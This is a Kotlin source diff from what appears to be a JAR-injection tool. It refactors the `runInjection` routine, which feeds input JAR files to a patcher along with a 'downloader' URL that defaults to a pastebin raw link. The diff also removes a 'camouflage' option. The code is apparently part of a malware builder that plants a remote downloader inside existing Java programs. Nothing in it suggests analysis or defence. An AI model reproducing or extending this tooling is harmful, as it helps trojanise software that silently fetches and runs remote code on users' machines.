@@ -49,11 +49,12 @@ fun runInjection(args: List<String>, logger: ConsoleLogger) {
     val configJson = File(configPath).readText(Charsets.UTF_8)
 
     val mode = findArg("mode", "m", args) ?: "single"
-    val inputPath = findArg("input", "i", args) ?: if (mode == "multiple") "in" else "in.jar"
-    val outputPath = findArg("output", "o", args) ?: if (mode == "multiple") "out" else "out.jar"
+    val inputPath = findArg("input", "i", args)
+        ?: if (mode == "multiple") "in" else "in.jar"
+    val outputPathArg = findArg("output", "o", args)
     val replace = boolArg("replace", "r", args)
-    val camouflage = boolArg("camouflage", null, args)
-    val downloaderUrl = findArg("url", "u", args) ?: "https://pastebin.com/raw/JD0bB1Eb"
+    val downloaderUrl = findArg("url", "u", args)
+        ?: "https://pastebin.com/raw/JD0bB1Eb"
 
     val inputFiles = when (mode) {
         "multiple" -> {
@@ -74,30 +75,38 @@ fun runInjection(args: List<String>, logger: ConsoleLogger) {
 
     inputFiles.forEach { inputFile ->
         val effectiveOutputFile = when {
-            replace -> inputFile
-            mode == "multiple" -> File(outputPath).apply { mkdirs() }.resolve(inputFile.name)
-            else -> File(outputPath)
+            outputPathArg != null -> {
+                if (mode == "multiple") {
+                    File(outputPathArg).apply { mkdirs() }.resolve(inputFile.name)
+                } else {
+                    File(outputPathArg)
+                }
+            }
+            else -> {
+                if (mode == "multiple") {
+                    File("out").apply { mkdirs() }.resolve(inputFile.name)
+                } else {
+                    File("out.jar")
+                }
+            }
         }
 
-        if (!replace && effectiveOutputFile.exists()) {
+        if (effectiveOutputFile.exists() && !replace) {
             logger.warn("Skipped because output file already exists: ${effectiveOutputFile.name}. Use --replace to overwrite.")
             return@forEach
         }
 
         try {
-            val inputBytes = inputFile.readBytes()
-            val patchedBytes = PatcherFacade.patchJar(
-                inputJarBytes = inputBytes,
+            val patchSuccessful = PatcherFacade.patchJar(
+                inputFile = inputFile.toPath(),
+                outputFile = effectiveOutputFile.toPath(),
                 configJson = configJson,
                 downloaderUrl = downloaderUrl,
-                useCamouflage = camouflage,
-                logger = logger,
-                originalFileName = inputFile.name
+                logger = logger
             )
 
-            if (!inputBytes.contentEquals(patchedBytes)) {
-                effectiveOutputFile.parentFile.mkdirs()
-                effectiveOutputFile.writeBytes(patchedBytes)
+            if (patchSuccessful) {
+                logger.info("Successfully patched ${inputFile.name} -> ${effectiveOutputFile.name}")
             }
         } catch (e: Exception) {
             if (e is InterruptedException) Thread.currentThread().interrupt()
